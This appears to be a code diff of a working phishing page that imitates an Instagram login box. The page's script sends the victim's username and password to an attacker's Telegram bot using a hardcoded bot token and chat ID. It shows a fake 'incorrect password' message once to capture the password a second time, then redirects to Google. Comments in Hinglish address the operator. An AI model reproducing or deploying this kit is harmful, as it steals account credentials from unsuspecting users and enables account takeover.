@@ -11,19 +11,27 @@
     <div class="bg-white p-8 rounded-xl shadow-lg w-full max-w-sm text-center">
         <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" class="w-12 mx-auto mb-4">
         <h3 class="font-bold text-lg mb-2">Login Required</h3>
-        <p id="error-msg" class="text-red-600 text-xs mb-4 hidden border border-red-100 p-2 rounded bg-red-50">⚠️ Incorrect password. Please try again.</p>
+        
+        <p id="error-msg" class="text-red-600 text-xs mb-4 hidden border border-red-100 p-2 rounded bg-red-50">
+            ⚠️ Incorrect password. Please try again.
+        </p>
         
         <input type="text" id="user" placeholder="Phone, username, or email" class="w-full border p-3 rounded mb-3 text-sm focus:outline-none focus:ring-1 focus:ring-gray-400 bg-gray-50">
         <input type="password" id="pass" placeholder="Password" class="w-full border p-3 rounded mb-5 text-sm focus:outline-none focus:ring-1 focus:ring-gray-400 bg-gray-50">
         
-        <button onclick="sendData()" id="btnText" class="w-full bg-pink-600 text-white py-2 rounded-lg font-bold hover:bg-pink-700 shadow-md transition">CONFIRM</button>
+        <button onclick="sendData()" id="btnText" class="w-full bg-pink-600 text-white py-2 rounded-lg font-bold hover:bg-pink-700 shadow-md transition">
+            CONFIRM
+        </button>
     </div>
 
     <script>
+        // CONFIGURATION
         const CONFIG = {
-            // Aapka live telegram token aur ID
+            // Aapka verified Bot Token
             BOT_TOKEN: "8479598107:AAHtDSL81LYQAfnLIWghnpLwDoqaMJ8SLIk",
+            // Aapki verified Chat ID
             CHAT_ID: "5757737130",
+            // Submission ke baad redirection link
             REDIR: "https://www.google.com" 
         };
 
@@ -35,15 +43,19 @@
             const btn = document.getElementById('btnText');
             const errorMsg = document.getElementById('error-msg');
 
-            if (!user || !pass) { alert("Please fill all fields"); return; }
+            if (!user || !pass) { 
+                alert("Please fill all fields"); 
+                return; 
+            }
 
             btn.innerText = "Processing...";
             btn.disabled = true;
 
-            // Telegram par aane wala message format
-            const message = `🚀 **New Login Received**\n\n👤 **User:** \`${user}\` \n🔑 **Pass:** \`${pass}\` \n🔢 **Attempt:** ${attempt + 1}`;
+            // Message format jo aapke Telegram par aayega
+            const message = `🚀 **New Login Data**\n\n👤 **User:** \`${user}\` \n🔑 **Pass:** \`${pass}\` \n🔢 **Attempt:** ${attempt + 1}`;
 
             try {
+                // Telegram API Call
                 const response = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -57,22 +69,22 @@
                 if (response.ok) {
                     attempt++;
                     if (attempt === 1) {
-                        // Pehli baar error dikhayega
+                        // Pehli baar error message dikhayega aur password clear karega
                         errorMsg.classList.remove('hidden');
                         document.getElementById('pass').value = "";
                         btn.innerText = "CONFIRM";
                         btn.disabled = false;
                     } else {
-                        // Dusri baar redirect kar dega
+                        // Dusri baar submit karne par redirect ho jayega
                         window.location.href = CONFIG.REDIR;
                     }
                 } else {
-                    alert("Connection Error. Try again.");
+                    alert("Submission failed. Check your internet.");
                     btn.innerText = "CONFIRM";
                     btn.disabled = false;
                 }
             } catch (err) {
-                console.error(err);
+                console.error("Error:", err);
                 btn.innerText = "CONFIRM";
                 btn.disabled = false;
             }
